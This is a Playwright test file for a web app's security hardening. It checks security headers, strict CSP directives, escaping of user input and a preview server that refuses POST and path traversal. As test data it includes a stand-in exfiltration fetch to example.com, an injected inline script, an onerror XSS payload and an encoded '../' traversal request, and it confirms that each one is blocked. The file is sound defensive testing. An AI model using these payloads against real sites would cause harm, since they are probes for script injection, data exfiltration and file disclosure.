import { CSP_META, SECURITY_HEADERS } from "../../security.mjs";
import { expect, openScreen, test } from "./fixtures";

test("every response carries the production security headers", async ({ page }) => {
  const responses: Array<{ url: string; headers: Record<string, string> }> = [];
  page.on("response", (r) => responses.push({ url: r.url(), headers: r.headers() }));
  await openScreen(page, "home");
  expect(responses.length).toBeGreaterThan(3);
  for (const r of responses) {
    for (const [name, value] of Object.entries(SECURITY_HEADERS)) {
      expect(r.headers[name.toLowerCase()], `${name} on ${r.url}`).toBe(value);
    }
  }
});

test("the header CSP is strict and the meta fallback matches it", async ({ page, request }) => {
  const csp = SECURITY_HEADERS["Content-Security-Policy"] ?? "";
  for (const directive of [
    "default-src 'self'",
    "script-src 'self'",
    "style-src 'self'",
    "img-src 'self' data:",
    "object-src 'none'",
    "base-uri 'none'",
    "frame-ancestors 'none'",
    "form-action 'none'",
  ]) {
    expect(csp).toContain(directive);
  }
  expect(csp).not.toMatch(/unsafe-inline|unsafe-eval|\*|https?:/);
  const html = await (await request.get("/index.html")).text();
  expect(html).toContain(`content="${CSP_META.replaceAll("'", "&#39;")}"`);
  expect(html).not.toMatch(/<script(?![^>]*\bsrc=)[^>]*>/);
  expect(html).not.toMatch(/\son[a-z]+=/);
  await page.goto("/");
  const meta = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute("content");
  expect(meta).toBe(CSP_META);
});

test("CSP blocks an injected off-origin fetch and inline script before any request is made", async ({ page, guard }) => {
  guard.allow(/Content Security Policy|CSP violation|Failed to fetch/i);
  await openScreen(page, "home");
  const outcome = await page.evaluate(async () => {
    const violations: string[] = [];
    document.addEventListener("securitypolicyviolation", (e) => violations.push(e.violatedDirective));
    let fetched = "sent";
    try {
      await fetch("https://example.com/exfiltrate");
    } catch {
      fetched = "blocked";
    }
    const s = document.createElement("script");
    s.textContent = "window.__pwned = true";
    document.head.append(s);
    await new Promise((r) => setTimeout(r, 50));
    return { fetched, pwned: (window as unknown as { __pwned?: boolean }).__pwned === true, violations };
  });
  expect(outcome.fetched).toBe("blocked");
  expect(outcome.pwned).toBe(false);
  expect(outcome.violations).toEqual(expect.arrayContaining(["connect-src", "script-src-elem"]));
  expect(guard.offOrigin).toEqual([]);
});

test("user-controlled text is rendered as text, never as HTML", async ({ page }) => {
  await openScreen(page, "home");
  await page.keyboard.press("Control+k");
  const payload = '<img src=x onerror="window.__xss=1">';
  await page.getByRole("combobox").fill(payload);
  await expect(page.locator(".palette__empty")).toContainText(payload.slice(0, 20));
  expect(await page.locator(".palette img").count()).toBe(0);
  expect(await page.evaluate(() => (window as unknown as { __xss?: number }).__xss)).toBeUndefined();
});

test("the preview server answers GET and HEAD only and never serves files outside dist", async ({ request }) => {
  const res = await request.post("/index.html", { data: "x" });
  expect(res.status()).toBe(405);
  const traversal = await request.get("/..%2f..%2fpackage.json");
  expect([403, 404]).toContain(traversal.status());
});
